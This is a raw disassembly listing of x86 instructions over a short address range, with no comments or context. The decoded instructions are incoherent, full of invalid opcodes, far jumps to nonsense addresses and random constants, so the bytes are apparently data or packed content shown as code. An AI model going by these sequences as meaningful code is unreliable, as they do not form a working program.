  41f3d5:	cwde   
  41f3d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f3d7:	das    
  41f3d8:	and    ah,cl
  41f3da:	mov    bl,BYTE PTR [ecx]
  41f3dc:	daa    
  41f3dd:	(bad)  
  41f3de:	mov    ebp,eax
  41f3e0:	rcl    dl,0xa9
  41f3e3:	and    ch,BYTE PTR [eax+0x26]
  41f3e6:	cmp    eax,DWORD PTR [ebx-0x2d3dbf08]
  41f3ec:	ror    BYTE PTR [ecx+0x7a],1
  41f3ef:	jno    0x41f431
  41f3f1:	mov    ah,0xd7
  41f3f3:	or     eax,0x2132c23e
  41f3f8:	or     eax,0x5eb54f93
  41f3fd:	or     edx,DWORD PTR [edx]
  41f3ff:	pop    edx
  41f400:	in     al,0xfe
  41f402:	adc    esi,DWORD PTR cs:[esi]
  41f405:	fdivr  st(1),st
  41f407:	mov    BYTE PTR [ebx+0x6e],al
  41f40a:	pop    esi
  41f40b:	fidivr WORD PTR ds:0x7b0df6
	...
  41f471:	add    BYTE PTR [eax],al
  41f473:	add    BYTE PTR [edi+eiz*8],bh
  41f476:	imul   ebp,edi,0xfffffffb
  41f479:	out    dx,eax
  41f47a:	mov    esp,0xd5fd13f7
  41f47f:	mov    ch,0xb6
  41f481:	xchg   esi,eax
  41f482:	mov    eax,0x14cc05c
  41f487:	add    BYTE PTR [ecx+eax*1],al
  41f48a:	add    BYTE PTR [eax],al
  41f48c:	mov    edx,0x96e58963
  41f491:	ror    dh,0xe3
  41f494:	mov    eax,ds:0x367adcfd
  41f499:	test   DWORD PTR [eax+0x3c],eax
  41f49c:	push   0x59a075c2
  41f4a1:	fdiv   DWORD PTR [edx*8-0x576b242e]
  41f4a8:	aaa    
  41f4a9:	ror    DWORD PTR [edx+0x5c],1
  41f4ac:	mov    ah,0x1d
  41f4ae:	imul   ebx,esi,0xffffffb1
  41f4b1:	test   al,0x1a
  41f4b3:	lock mov ebx,0x2035d771
  41f4b9:	retf   
  41f4ba:	inc    esi
  41f4bb:	scas   al,BYTE PTR es:[edi]
  41f4bc:	jbe    0x41f493
  41f4be:	xchg   ecx,eax
  41f4bf:	int3   
  41f4c0:	fisubr DWORD PTR [esp+edx*1-0x5c]
  41f4c4:	ja     0x41f449
  41f4c6:	sbb    edx,0xe7ac5802
  41f4cc:	sbb    edx,ebx
  41f4ce:	popa   
  41f4cf:	xlat   BYTE PTR ds:[ebx]
  41f4d0:	add    dh,0xcc
  41f4d3:	add    edi,esp
  41f4d5:	aas    
  41f4d6:	xchg   ebp,eax
  41f4d7:	(bad)  
  41f4d8:	jp     0x41f4b3
  41f4da:	pusha  
  41f4db:	inc    ebx
  41f4dc:	test   eax,0xaa6c124d
  41f4e1:	lods   eax,DWORD PTR ds:[esi]
  41f4e2:	cs push 0xde5c6812
  41f4e8:	lds    edi,FWORD PTR [esi+0x2e]
  41f4eb:	cmp    ebx,edx
  41f4ed:	lahf   
  41f4ee:	mov    bl,0x14
  41f4f0:	int    0x7
  41f4f2:	mov    ebp,0x5b5c4a38
  41f4f7:	aad    0x2c
  41f4f9:	xchg   esp,eax
  41f4fa:	test   al,0x3f
  41f4fc:	retf   0x670e
  41f4ff:	add    al,BYTE PTR [edx]
  41f501:	in     eax,dx
  41f502:	jle    0x41f4cf
  41f504:	in     eax,0x8c
  41f506:	inc    esi
  41f507:	in     al,dx
  41f508:	mov    ?,esi
  41f50a:	add    ebp,DWORD PTR [eax]
  41f50c:	hlt    
  41f50d:	clc    
  41f50e:	push   ebx
  41f50f:	popa   
  41f510:	fs inc esp
  41f512:	pop    ecx
  41f513:	jge    0x41f588
  41f515:	test   eax,0x14197eb0
  41f51a:	rol    DWORD PTR [ebx+0x4d],0x87
  41f51e:	xchg   ebx,eax
  41f51f:	cmp    DWORD PTR [eax-0x71],ebp
  41f522:	mov    cl,0xe2
  41f524:	aas    
  41f525:	jmp    0x3ef2:0x15da5b7a
  41f52c:	jbe    0x41f4f1
  41f52e:	mov    cl,0x26
  41f530:	xor    cl,BYTE PTR [edi+0x74d34285]
  41f536:	dec    edx
  41f537:	xor    eax,0xaa31d80b
  41f53c:	mov    ah,0xc8
  41f53e:	xchg   edx,eax
  41f53f:	fld    DWORD PTR [edi+0x67]
  41f542:	xchg   esi,eax
  41f543:	pop    es
  41f544:	stc    
  41f545:	dec    edx
  41f546:	push   edi
  41f547:	iret   
  41f548:	or     edi,ebp
  41f54a:	pusha  
  41f54b:	cmp    esp,DWORD PTR ds:0x4b2298ab
  41f551:	pop    ebx
  41f552:	dec    esi
  41f553:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f554:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f555:	hlt    
  41f556:	shr    edx,1
  41f558:	pop    ebx
  41f559:	xor    eax,0x8b9083d4
  41f55e:	lahf   
  41f55f:	add    al,0x7c
  41f561:	pop    ebx
  41f562:	sbb    al,0xab
  41f564:	int    0x13
  41f566:	pop    ds
  41f567:	in     eax,dx
  41f568:	push   eax
  41f569:	ins    BYTE PTR es:[edi],dx
  41f56a:	sbb    BYTE PTR [eax-0x2a9acab3],ah
  41f570:	outs   dx,DWORD PTR ds:[esi]
  41f571:	mov    dh,0x43
  41f573:	dec    esp
  41f574:	push   0x13318b0b
  41f579:	lods   al,BYTE PTR ds:[si]
  41f57b:	std    
  41f57c:	in     al,0x3f
  41f57e:	test   eax,0x86f09b74
  41f583:	loopne 0x41f582
  41f585:	push   cs
  41f586:	stos   BYTE PTR es:[edi],al
  41f587:	push   esp
  41f588:	push   0xc02d77b1
  41f58d:	bound  ebp,QWORD PTR [edx-0x1d]
	...
  41f5f4:	js     0x41f62a
  41f5f6:	add    bh,bl
  41f5f8:	dec    esi
  41f5f9:	(bad)  
  41f5fa:	stc    
  41f5fb:	mov    bh,0xb7
  41f5fd:	jmp    0x776c:0xfbfed422
  41f604:	les    ecx,FWORD PTR [ebp+0x1]
  41f607:	add    BYTE PTR [ecx+eax*1],al
  41f60a:	add    BYTE PTR [eax],al
  41f60c:	dec    ebp
  41f60d:	pop    esi
  41f60e:	mov    esp,0x617cf88a
  41f613:	jne    0x41f667
  41f615:	jecxz  0x41f5c5
  41f617:	ins    BYTE PTR es:[edi],dx
  41f618:	xchg   ecx,eax
  41f619:	add    al,0xa3
  41f61b:	xchg   ecx,eax
  41f61c:	rol    DWORD PTR [ebp+0x22],cl
  41f61f:	xor    eax,0xff5ddc82
  41f624:	xor    cl,dl
  41f626:	(bad)  
  41f627:	mov    esi,ds
  41f629:	adc    ecx,eax
  41f62b:	push   cs
  41f62c:	mov    dl,0xda
  41f62e:	aad    0xfd
  41f630:	popa   
  41f631:	jecxz  0x41f61f
  41f633:	out    dx,eax
  41f634:	jbe    0x41f6a5
  41f636:	adc    DWORD PTR [ebp+eax*4+0x3e19e035],edi
  41f63d:	jbe    0x41f5d4
  41f63f:	out    0x6b,al
  41f641:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f642:	shl    edx,1
  41f644:	rcr    eax,0x48
  41f647:	dec    esp
  41f648:	mov    ds,ebp
  41f64a:	(bad)  
  41f64b:	cmp    eax,0xd69c24db
  41f650:	aas    
  41f651:	jg     0x41f66e
  41f653:	pop    ds
  41f654:	or     ecx,DWORD PTR [ecx-0x716e95f9]
  41f65a:	xor    eax,0x1a036e67
  41f65f:	inc    eax
  41f660:	dec    esi
  41f661:	je     0x41f5fa
  41f663:	sub    ch,0x43
  41f666:	repz in al,dx
  41f668:	in     eax,0x6b
  41f66a:	pop    ecx
  41f66b:	popf   
  41f66c:	cmp    al,0xfc
  41f66e:	and    BYTE PTR [ebx+0x54],dl
  41f671:	pop    esi
  41f672:	(bad)  
  41f673:	adc    al,0x74
  41f675:	adc    al,0xac
  41f677:	pop    es
  41f678:	xchg   esp,eax
  41f679:	sti    
  41f67a:	loop   0x41f626
  41f67c:	sbb    eax,0x531e11a9
  41f681:	mov    cl,0x1c
  41f683:	sahf   
  41f684:	xor    DWORD PTR [esi+eiz*8],ecx
  41f687:	inc    edx
  41f688:	dec    esp
  41f689:	ja     0x41f6b1
  41f68b:	and    BYTE PTR [eax+esi*8-0x27974251],0x6b
  41f693:	repnz xor eax,0xafd24977
  41f699:	mov    cl,0xea
  41f69b:	cmp    al,0x26
  41f69d:	dec    edi
  41f69e:	pop    ss
  41f69f:	jmp    0xdf640bf9
  41f6a4:	sbb    al,BYTE PTR [ebp+0x7a737ce6]
  41f6aa:	pop    ecx
  41f6ac:	xchg   ebx,eax
  41f6ad:	pop    eax
  41f6ae:	jecxz  0x41f651
  41f6b0:	pop    eax
  41f6b1:	cs fs pop edx
  41f6b4:	sbb    bh,0xc3
  41f6b7:	aad    0xda
  41f6b9:	sahf   
  41f6ba:	test   al,0xce
  41f6bc:	nop
  41f6bd:	pop    edx
  41f6be:	int3   
  41f6bf:	lds    edx,FWORD PTR [edx-0xf918c09]
  41f6c5:	dec    esi
  41f6c6:	push   edi
  41f6c7:	sbb    eax,0x968052db
  41f6cc:	mov    esp,0xbf147aee
  41f6d1:	sub    DWORD PTR [ecx+0x64afd9b0],esp
  41f6d7:	retf   
  41f6d8:	cmp    DWORD PTR [edi+ecx*4],esi
  41f6db:	xor    al,0x57
  41f6dd:	adc    al,0x39
  41f6df:	or     esp,esi
  41f6e1:	scas   al,BYTE PTR es:[edi]
  41f6e2:	and    DWORD PTR [edi+0x6a8f1045],eax
  41f6e8:	lahf   
  41f6e9:	sbb    bh,BYTE PTR [edi+0x68c39eb7]
  41f6ef:	jo     0x41f73c
  41f6f1:	mov    ebx,0x662462e8
  41f6f6:	jmp    0x85784ce9
  41f6fb:	cld    
  41f6fc:	fimul  WORD PTR [edx-0x18e9859c]
  41f702:	mov    esi,0x30245e8d
  41f707:	add    bl,BYTE PTR [eax]
  41f709:	sbb    eax,0xab81ac2f
  41f70e:	(bad)  
  41f70f:	aam    0x0
	...
  41f771:	add    BYTE PTR [eax],al
  41f773:	add    BYTE PTR [edx-0x5081dcc4],dl
  41f779:	jg     0x41f75a
  41f77b:	cld    
  41f77c:	call   0xa07f:0xb16c62d2
  41f783:	pop    eax
  41f784:	enter  0x14e,0x0
  41f788:	add    al,0x1
  41f78a:	add    BYTE PTR [eax],al
  41f78c:	jno    0x41f7b9
  41f78e:	xchg   ecx,eax
  41f78f:	pop    ebx
  41f790:	aam    0x3c
  41f792:	cmp    dh,BYTE PTR [ebx]
  41f794:	and    cl,BYTE PTR [edi+0x50]
  41f797:	jp     0x41f80c
  41f799:	lods   eax,DWORD PTR ds:[esi]
  41f79a:	cmp    ebx,esp
  41f79c:	cmp    DWORD PTR ds:0x8368a487,edx
  41f7a2:	fsubr  DWORD PTR [eax-0x1b]
  41f7a5:	and    eax,0xd68a9429
  41f7aa:	pop    es
  41f7ab:	cmp    dl,BYTE PTR [eax]
  41f7ad:	loop   0x41f778
  41f7af:	sti    
  41f7b0:	iret   
  41f7b1:	arpl   WORD PTR [edi],di
  41f7b3:	pop    ebp
  41f7b4:	pop    ecx
  41f7b5:	pop    eax
  41f7b6:	dec    ebp
  41f7b7:	sub    DWORD PTR [edx],0xffffffb8
  41f7ba:	ret    0x4b1c
  41f7bd:	or     eax,0xa1d31caa
  41f7c2:	daa    
  41f7c3:	dec    ecx
  41f7c4:	sub    DWORD PTR [edx],0x45
  41f7c7:	into   
  41f7c8:	inc    ebp
  41f7c9:	adc    al,0x15
  41f7cb:	test   edi,esi
  41f7cd:	push   edx
  41f7ce:	adc    ebp,DWORD PTR [edi+0x5f08bf53]
  41f7d4:	dec    ebp
  41f7d5:	mov    edi,0xacfc7b99
  41f7da:	sub    al,BYTE PTR [edi-0x68ffe869]
  41f7e0:	xchg   ebx,eax
  41f7e1:	scas   al,BYTE PTR es:[edi]
  41f7e2:	pop    ds
  41f7e3:	call   0x83f4dc94
  41f7e8:	test   dh,al
  41f7ea:	jb     0x41f843
  41f7ec:	adc    al,0xe1
  41f7ee:	(bad)  [esi+0x5344df12]
  41f7f4:	dec    ebp
  41f7f5:	jge    0x41f78d
  41f7f7:	or     edx,DWORD PTR [ebx]
  41f7f9:	adc    bl,BYTE PTR [eax+0x56]
  41f7fc:	sbb    ch,BYTE PTR [ecx+0x555685bf]
  41f802:	dec    ebx
  41f803:	mov    ds:0xf39e0a5,eax
  41f808:	outs   dx,BYTE PTR ds:[esi]
  41f809:	jle    0x41f858
  41f80b:	test   eax,0x21908897
  41f810:	stos   BYTE PTR es:[edi],al
  41f811:	jnp    0x41f84f
  41f813:	js     0x41f88c
  41f815:	inc    ebx
  41f816:	inc    edi
  41f817:	js     0x41f88e
  41f819:	dec    esp
  41f81a:	adc    eax,0x158359a5
  41f81f:	mov    BYTE PTR [ebp-0x409da7e7],0x5e
  41f826:	or     al,0x98
  41f828:	xor    DWORD PTR [edx+0x68],0x49ed5bd1
  41f82f:	fist   WORD PTR [ebx+eax*4-0x19]
  41f833:	and    eax,0xf3cfb8a6
  41f838:	mov    ch,0x82
  41f83a:	das    
  41f83b:	nop
  41f83c:	sar    BYTE PTR [esi],1
  41f83e:	(bad)  
  41f83f:	out    dx,al
  41f840:	and    ebp,ebx
  41f842:	cmp    DWORD PTR [ecx+0x738750b7],0x7d
  41f849:	cmp    al,0xf9
  41f84b:	test   esi,edx
  41f84d:	push   esi
  41f84e:	call   0x1d5d:0xa9f5d309
  41f855:	int3   
  41f856:	ret    0xeff5
  41f859:	loop   0x41f865
  41f85b:	hlt    
  41f85c:	mov    dl,BYTE PTR [ecx]
  41f85e:	(bad)
  41f861:	stc    
  41f862:	push   cs
  41f863:	inc    ecx
  41f864:	xor    al,0x7b
  41f866:	iret   
  41f867:	push   ecx
  41f868:	test   edx,esi
  41f86a:	pop    es
  41f86b:	stos   DWORD PTR es:[edi],eax
  41f86c:	mov    dh,0x25
  41f86e:	or     ebx,DWORD PTR [ecx-0x46]
  41f871:	and    esp,ecx
  41f873:	or     al,0xdc
  41f875:	icebp  
  41f876:	leave  
  41f877:	mov    bh,0xbf
  41f879:	cmp    esp,ebp
  41f87b:	cdq    
  41f87c:	adc    dl,BYTE PTR [edx-0x172ec007]
  41f882:	jae    0x41f852
  41f884:	push   ebp
  41f885:	dec    ebx
  41f886:	stos   BYTE PTR es:[edi],al
  41f887:	cs push esp
  41f889:	lock retf 
  41f88b:	xor    ch,BYTE PTR [esi+0x5afd8a]
	...
  41f8f1:	add    BYTE PTR [eax],al
  41f8f3:	add    BYTE PTR [ecx+0x3b920b9a],ah
  41f8f9:	xchg   ebx,eax
  41f8fa:	mov    ecx,0x4183febb
  41f8ff:	pop    edx
  41f900:	fld    DWORD PTR [ecx-0x4a]
  41f903:	test   ah,0x4f
  41f906:	add    DWORD PTR [eax],eax
  41f908:	add    al,0x1
  41f90a:	add    BYTE PTR [eax],al
  41f90c:	xor    dh,BYTE PTR [eax]
  41f90e:	xor    BYTE PTR [edx-0x57],cl
  41f911:	test   eax,0x6c8eb925
  41f916:	into   
  41f917:	gs mov ecx,ebp
  41f91a:	and    cl,BYTE PTR [eax-0x31]
  41f91d:	arpl   dx,dx
  41f91f:	adc    cl,BYTE PTR [ebx]
  41f921:	mov    al,0xd2
  41f923:	in     al,0xa2
  41f925:	lock push esi
  41f927:	nop
  41f928:	ror    ch,cl
  41f92a:	in     al,dx
  41f92b:	mov    cl,0x7e
  41f92d:	fwait
  41f92e:	pop    es
  41f92f:	(bad)  
  41f930:	je     0x41f96b
  41f932:	iret   
  41f933:	and    BYTE PTR [esi+0x4b],0x5a
  41f937:	mov    ds,WORD PTR [edx]
  41f939:	cmp    DWORD PTR [ecx-0x69],0x80a7f90f
  41f940:	add    ecx,esp
  41f942:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f943:	fimul  DWORD PTR [esi]
  41f945:	repz inc ebp
  41f947:	lods   al,BYTE PTR ds:[esi]
  41f948:	jns    0x41f957
  41f94a:	addr16 dec ecx
  41f94c:	es (bad) 
  41f94e:	push   edx
  41f94f:	ret    0x9d07
  41f952:	jmp    DWORD PTR [ebx+0x28]
  41f955:	cmp    eax,0x525d8ed8
  41f95a:	int3   
  41f95b:	push   0xffffffef
  41f95d:	ret    0x4c29
  41f960:	cmp    ch,bh
  41f962:	clc    
  41f963:	add    al,0x55
  41f965:	inc    edx
  41f966:	call   0x518f97ec
  41f96b:	scas   al,BYTE PTR es:[edi]
  41f96c:	sub    DWORD PTR [edx-0x19],ebx
  41f96f:	(bad)  
  41f970:	loop   0x41f977
  41f972:	inc    edx
  41f973:	and    ebp,DWORD PTR [edi-0x5a]
  41f976:	seto   BYTE PTR [ecx+0x64659d8c]
  41f97d:	push   edx
  41f97e:	(bad)
  41f981:	push   ebx
  41f982:	mov    ecx,0x8f9c0972
  41f987:	push   ecx
  41f988:	out    0xd6,eax
  41f98a:	pop    eax
  41f98b:	aas    
  41f98c:	ret    0xcabf
  41f98f:	out    dx,eax
  41f990:	clc    
  41f991:	push   es
  41f992:	js     0x41f9fe
  41f994:	bound  esp,QWORD PTR [esp+eax*8+0x2f]
  41f998:	adc    bh,BYTE PTR [esi]
  41f99a:	nop
  41f99b:	jmp    FWORD PTR [ebx]
  41f99d:	mov    ch,BYTE PTR [ebp-0xc7a158b]
  41f9a3:	sbb    DWORD PTR [ecx],0x9
  41f9a6:	xlat   BYTE PTR ds:[ebx]
  41f9a7:	xor    al,0x57
  41f9a9:	adc    esi,ebp
  41f9ab:	and    ch,BYTE PTR [ecx+0x66]
  41f9ae:	sub    ch,BYTE PTR ds:0xd80cc00
  41f9b4:	push   esi
  41f9b5:	test   eax,0x5e50bc4e
  41f9ba:	(bad)  
  41f9bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f9bd:	cmc    
  41f9be:	shl    DWORD PTR [esi],1
  41f9c0:	pusha  
  41f9c1:	sbb    BYTE PTR ds:0x5b3eaa87,bh
  41f9c7:	mov    esp,0x4752d51f
  41f9cc:	and    eax,0xc216cecf
  41f9d1:	xor    ecx,0x56a7d257
  41f9d7:	mov    ecx,0x8d98e0ca
  41f9dc:	xchg   edx,eax
  41f9dd:	mov    eax,DWORD PTR [eax-0x58cb8818]
  41f9e3:	popf   
  41f9e4:	xchg   ebx,eax
  41f9e5:	mov    esp,0x1489303a
  41f9ea:	sbb    ebp,0x958f5593
  41f9f0:	loope  0x41f9cd
  41f9f2:	shl    BYTE PTR [esi],0xab
  41f9f5:	shl    DWORD PTR [eax+0x235450e2],1
  41f9fb:	icebp  
  41f9fc:	mov    ecx,0xa7f7ca2c
  41fa01:	inc    ebx
  41fa02:	sbb    al,0x0
  41fa04:	xchg   edi,eax
  41fa05:	mov    dl,BYTE PTR [edx+esi*8+0x741640f2]
  41fa0c:	mov    ds:0xa60a46,eax
	...
  41fa71:	add    BYTE PTR [eax],al
  41fa73:	add    BYTE PTR [edx],cl
  41fa75:	inc    ecx
  41fa76:	mov    bh,0xa1
  41fa78:	push   edi
  41fa7a:	push   ds
  41fa7b:	jmp    0x41faa0
  41fa7d:	push   edi
  41fa7e:	mov    ds:0xd9f68715,eax
  41fa83:	sti    
  41fa84:	rcl    BYTE PTR [eax+0x1],1
  41fa87:	add    BYTE PTR [ecx+eax*1],al
  41fa8a:	add    BYTE PTR [eax],al
  41fa8c:	lods   eax,DWORD PTR ds:[esi]
  41fa8d:	(bad)  
  41fa8e:	imul   ebp,ecx,0x27
  41fa91:	sbb    eax,0xd4cc9a66
  41fa96:	mov    esp,0x2a6d3410
  41fa9b:	mov    bl,0xa1
  41fa9d:	dec    edi
  41fa9e:	pop    eax
  41fa9f:	push   edi
  41faa0:	mov    dl,0xed
  41faa2:	sahf   
  41faa3:	xchg   ah,dh
  41faa5:	cmp    DWORD PTR [edx],edx
  41faa7:	mov    ds:0x4ae6e806,eax
  41faac:	arpl   WORD PTR [edx-0x11],cx
  41faaf:	add    edi,DWORD PTR [edx-0x5a6f25c3]
  41fab5:	jp     0x41fad5
  41fab7:	adc    eax,0x994b3fa5
  41fabc:	rol    BYTE PTR [edx],cl
  41fabe:	cmp    eax,0xffdbdd04
  41fac3:	retf   
  41fac4:	clc    
  41fac5:	loopne 0x41fa83
  41fac7:	add    esi,DWORD PTR [ebx+0x2f9649be]
  41facd:	cmp    al,BYTE PTR [edx+0x3d20ad71]
  41fad3:	mov    eax,DWORD PTR [esi-0x2783e8a5]
  41fad9:	test   ah,bl
  41fadb:	or     BYTE PTR [eax+0x2e0663c6],ch
  41fae1:	add    DWORD PTR [ebx-0x340fea8],esi
  41fae7:	shl    DWORD PTR [eax],cl
  41fae9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41faea:	cmp    DWORD PTR [eax-0x4],ebx
  41faed:	dec    esp
  41faee:	repz mov ah,0x5c
  41faf1:	push   eax
  41faf2:	imul   ecx,DWORD PTR [eax+0x60],0x48
  41faf6:	out    0x19,eax
  41faf8:	js     0x41fb28
  41fafa:	pop    eax
  41fafb:	jno    0x41fb21
  41fafd:	push   ebp
  41fafe:	push   edx
  41faff:	(bad)
  41fb03:	dec    esp
  41fb04:	out    0x47,al
  41fb06:	cli    
  41fb07:	inc    ebp
  41fb08:	mov    ss,WORD PTR [edx-0xd18c33e]
  41fb0e:	sti    
  41fb0f:	test   BYTE PTR [edx-0x55],ah
  41fb12:	sar    ch,1
  41fb14:	push   ds
  41fb15:	mov    esp,0x429ce6c5
  41fb1a:	or     ecx,DWORD PTR [esi]
  41fb1c:	pop    es
  41fb1d:	add    cl,ch
  41fb1f:	xchg   esi,eax
  41fb20:	push   ecx
  41fb21:	stc    
  41fb22:	lods   eax,DWORD PTR ds:[esi]
  41fb23:	enter  0xf254,0x2e
  41fb27:	xchg   DWORD PTR [edi],ebx
  41fb29:	in     eax,dx
  41fb2a:	jb     0x41fb83
  41fb2c:	lahf   
  41fb2d:	cld    
  41fb2e:	mov    esp,0xe96685f2
  41fb33:	add    al,0xfa
  41fb35:	add    dh,BYTE PTR [edx]
  41fb37:	xor    esp,DWORD PTR [ebx+eax*2]
  41fb3a:	loop   0x41faf8
  41fb3c:	sbb    BYTE PTR [ecx+0x71ff9a08],0x27
  41fb43:	scas   eax,DWORD PTR es:[edi]
  41fb44:	mov    dl,0x50
  41fb46:	into   
  41fb47:	mov    edx,0x8910a3e9
  41fb4c:	dec    esp
  41fb4d:	cwde   
  41fb4e:	add    DWORD PTR [ebx-0x5de859f2],0x1c
  41fb55:	jne    0x41fbad
  41fb57:	retf   
  41fb58:	jne    0x41fb55
  41fb5a:	or     BYTE PTR [eax+edi*1-0x8],0x3b
  41fb5f:	(bad)  
  41fb60:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fb61:	jns    0x41fba8
  41fb63:	cmp    BYTE PTR fs:[ecx+0x23],bh
  41fb67:	inc    edi
  41fb68:	loopne 0x41fb10
  41fb6a:	(bad)
  41fb6e:	push   es
  41fb6f:	inc    edi
  41fb70:	std    
  41fb71:	nop
  41fb72:	mov    ebx,0x2aa084aa
  41fb77:	mov    edi,0xac9d592a
  41fb7c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fb7d:	cmp    esp,ebp
  41fb7f:	dec    esi
  41fb80:	lock frstor gs:[edi-0x44]
  41fb85:	(bad)  
  41fb86:	in     eax,dx
  41fb87:	inc    edi
  41fb88:	rcr    edi,cl
  41fb8a:	xchg   DWORD PTR [edx],ebp
  41fb8c:	xor    ch,BYTE PTR [edi+edx*4-0xd]
	...
  41fbf4:	fsubr  QWORD PTR [eax]
  41fbf6:	mov    ah,ah
  41fbf8:	(bad)  
  41fbf9:	out    0xfe,al
  41fbfb:	cmp    BYTE PTR [esi],ah
  41fbfd:	ret    
  41fbfe:	or     DWORD PTR [esi],edx
  41fc00:	mov    DWORD PTR [ebx+0x51d44729],0x1040001
  41fc0a:	add    BYTE PTR [eax],al
  41fc0c:	(bad)  
  41fc0d:	push   ecx
  41fc0e:	pushf  
  41fc0f:	jmp    0x7b4f3460
  41fc14:	jmp    0xb8f9bc1c
  41fc19:	ficomp WORD PTR [ecx+0x25951d8d]
  41fc1f:	inc    eax
  41fc20:	mov    eax,0x7010e56a
  41fc25:	stos   BYTE PTR es:[edi],al
  41fc26:	in     eax,0x9
  41fc28:	mov    dl,0xe2
  41fc2a:	or     eax,DWORD PTR [ebx+edx*1]
  41fc2d:	xor    eax,0xe5fef22e
  41fc32:	loope  0x41fbdf
  41fc34:	jg     0x41fc4a
  41fc36:	mov    eax,cs
  41fc38:	adc    eax,eax
  41fc3a:	hlt    
  41fc3b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fc3c:	push   ds
  41fc3d:	push   cs
  41fc3e:	pop    eax
  41fc3f:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  41fc41:	les    eax,FWORD PTR [esi-0x47d32fe3]
  41fc47:	in     al,0x2d
  41fc49:	in     al,dx
  41fc4a:	mov    es,WORD PTR [edx+ebx*1-0x80]
  41fc4e:	push   ss
  41fc4f:	(bad)  
  41fc50:	test   BYTE PTR [esi+0x6835134b],0x3
  41fc57:	lods   eax,DWORD PTR ds:[esi]
  41fc58:	xor    dl,BYTE PTR [edx+0x24]
  41fc5b:	data16 cs (bad) 
  41fc5e:	sub    al,0x8c
  41fc60:	sub    eax,0x4987c4d7
  41fc65:	es repnz xor ax,0xb532
  41fc6b:	repz push ss
  41fc6d:	mov    bl,0x4d
  41fc6f:	pusha  
  41fc70:	repz mov eax,0x5fc90c2f
  41fc76:	pop    ecx
  41fc77:	(bad)  
  41fc78:	imul   edx,DWORD PTR [eax+0x2138838a],0xffffffcd
  41fc7f:	inc    esi
  41fc80:	dec    edx
  41fc81:	mov    BYTE PTR [ebx+0x491a39fc],dl
  41fc87:	scas   eax,DWORD PTR es:[edi]
  41fc88:	cmp    BYTE PTR [esi-0x3c],dh
  41fc8b:	lods   eax,DWORD PTR ds:[esi]
  41fc8c:	xchg   esi,eax
  41fc8d:	push   edx
  41fc8e:	jle    0x41fd09
  41fc90:	cwde   
  41fc91:	aaa    
  41fc92:	mov    ebx,0xd0516066
  41fc97:	out    0x34,eax
  41fc99:	scas   al,BYTE PTR es:[edi]
  41fc9a:	mov    edi,0x86f2a842
  41fc9f:	push   esp
  41fca0:	xor    DWORD PTR [eax],esp
  41fca2:	mov    dh,0x59
  41fca4:	inc    ecx
  41fca5:	popa   
  41fca6:	xchg   esi,eax
  41fca7:	or     cl,dl
  41fca9:	test   DWORD PTR [ecx],esi
  41fcab:	clc    
  41fcac:	jnp    0x41fcf3
  41fcae:	xor    al,0x36
  41fcb0:	div    al
  41fcb2:	jmp    0x41fc96
  41fcb4:	sbb    dh,cl
  41fcb6:	dec    eax
  41fcb7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fcb8:	call   0xd470f75b
  41fcbd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fcbe:	mov    esi,0x44a01420
  41fcc3:	cdq    
  41fcc4:	xchg   edx,eax
  41fcc5:	pmaddwd mm5,QWORD PTR [ecx+0x66]
  41fcc9:	mov    al,0xa0
  41fccb:	aam    0xf2
  41fccd:	push   edi
  41fcce:	rcl    ah,0xaa
  41fcd1:	jno    0x41fc5c
  41fcd3:	mov    al,ds:0x8aaadf48
  41fcd8:	(bad)  
  41fcd9:	fmul   QWORD PTR [ebx+0x34e10fa7]
  41fcdf:	mov    cl,0xe5
  41fce1:	sbb    esi,DWORD PTR [ebx+0x25]
  41fce4:	repz add ah,ah
  41fce7:	jne    0x41fc73
  41fce9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fcea:	and    dl,BYTE PTR [ecx]
  41fcec:	test   eax,0xb62d94a4
  41fcf1:	stos   DWORD PTR es:[edi],eax
  41fcf2:	gs jl  0x41fd15
  41fcf5:	jecxz  0x41fca6
  41fcf7:	and    al,0x35
  41fcf9:	cmc    
  41fcfa:	inc    edx
  41fcfb:	out    0xb,eax
  41fcfd:	or     al,BYTE PTR ds:0xc08d75a5
  41fd03:	push   es
  41fd04:	popa   
  41fd05:	jno    0x41fd2b
  41fd07:	mov    eax,ebp
  41fd09:	add    dl,bh
  41fd0b:	cmp    al,0x44
  41fd0d:	(bad)  
  41fd0e:	fbld   TBYTE PTR [edx]
	...
  41fd74:	or     al,0x6a
  41fd76:	push   edx
  41fd77:	shl    DWORD PTR [esi-0x7],0x9f
  41fd7b:	out    dx,eax
  41fd7c:	pop    ds
  41fd7d:	pop    edx
  41fd7e:	pushf  
  41fd7f:	push   ss
  41fd80:	sub    al,0xaa
  41fd82:	nop
  41fd83:	(bad)  
  41fd84:	fcom   DWORD PTR [edx+0x1]
  41fd87:	add    BYTE PTR [ecx+eax*1],al
  41fd8a:	add    BYTE PTR [eax],al
  41fd8c:	push   ebx
  41fd8d:	shr    edx,0x9a
  41fd90:	push   ebp
  41fd91:	vunpckhps ymm3,ymm3,YMMWORD PTR [edi-0x4e76ebcf]
  41fd99:	add    DWORD PTR [eax+0x35],esi
  41fd9c:	in     al,0x81
  41fd9e:	pushf  
  41fd9f:	jb     0x41fd32
  41fda1:	jmp    0x41fdf9
  41fda3:	ins    DWORD PTR es:[edi],dx
  41fda4:	xchg   esi,eax
  41fda5:	jp     0x41fdb2
  41fda7:	inc    eax
  41fda8:	or     eax,0x5bf8e203
  41fdad:	mov    ch,0xc4
  41fdaf:	test   eax,0x72e25cd2
  41fdb4:	aad    0x5e
  41fdb6:	jno    0x41fd7f
  41fdb8:	lods   al,BYTE PTR ds:[esi]
  41fdb9:	pop    ecx
  41fdba:	and    eax,0xec11402
  41fdbf:	adc    DWORD PTR [eax],ecx
  41fdc1:	call   0x8fcc:0xdc94e615
  41fdc8:	push   esp
